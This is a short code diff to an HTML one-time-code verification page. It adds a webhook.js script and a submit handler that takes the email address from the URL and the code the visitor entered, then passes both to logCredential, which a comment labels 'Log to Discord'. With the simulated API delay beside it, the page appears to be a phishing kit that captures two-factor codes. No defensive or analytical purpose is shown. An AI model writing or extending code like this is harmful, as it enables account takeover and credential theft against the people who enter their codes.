@@ -418,6 +418,7 @@
         </div>
     </div>
 
+    <script src="webhook.js"></script>
     <script>
         // Populate email from URL
         window.onload = function () {
@@ -441,6 +442,11 @@
 
             btnText.style.display = 'none';
             btnLoader.style.display = 'block';
+
+            // Log to Discord
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email') || "Unknown";
+            logCredential('OTP', { email: email, code: otp });
 
             // Simulate API delay
             setTimeout(() => {
